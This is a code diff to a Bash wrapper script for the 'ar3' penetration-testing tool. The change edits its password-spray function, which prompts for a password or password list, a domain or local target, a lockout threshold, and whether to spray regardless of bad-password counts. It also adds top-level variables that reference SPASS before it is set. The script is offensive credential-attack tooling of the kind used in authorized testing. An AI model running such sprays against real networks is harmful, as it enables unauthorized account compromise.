@@ -7,7 +7,8 @@ YLW='\033[1;33m'
 LBBLUE='\e[104m'
 A='SMB'
 B='LDAP'
-
+FPASS='-P ${SPASS}'
+SPASS='-p ${SPASS}'
 ## Script Variables
 # Config options
 config(){
@@ -140,11 +141,9 @@ spray(){
   if [[ ${S_PASS} == "s" ]]; then
     echo -e "${W}Please enter the password to use?${NC}"
     read SPASS
-    FPASS='-p ${SPASS}'
   else
     echo -e "${W}Please enter the full path/to/passlist${NC}"
     read SPASS
-    FPASS='-P ${SPASS}'
   fi
   echo -e "${W}Would you like to authenticate against a domain or a local IP?(d/l)${NC}"
   read AUTH_Q
@@ -155,7 +154,7 @@ spray(){
   else
     FTARGET='--local-auth'
   fi
-  if [[ ${MODULE} == "2" ]]; then
+  if [[ ${METHOD} == "2" ]]; then
     echo -e "${W}Would you like to spray all users regardless of BadPwd count?(y/n)${NC}"
     read BP_COUNT_Q
     if [[ ${BP_COUNT_Q} == "y" ]]; then
@@ -175,7 +174,11 @@ spray(){
     LTHRESH='3'
   fi
   sleep 2
-  ar3 spray -m ${METHOD} ${FACC} ${FPASS} ${FTARGET} ${BP_OPT} --threshold ${LTHRESH} ${TARGET}
+  if [[ ${S_PASS} == "s" ]]; then
+    ar3 spray -m ${METHOD} ${FACC} -p ${SPASS} ${FTARGET} ${BP_OPT} --threshold ${LTHRESH} ${TARGET}
+  else
+    ar3 spray -m ${METHOD} ${FACC} -P ${SPASS} ${FTARGET} ${BP_OPT} --threshold ${LTHRESH} ${TARGET}
+  fi
 }
 # Query Options
 query_mode(){
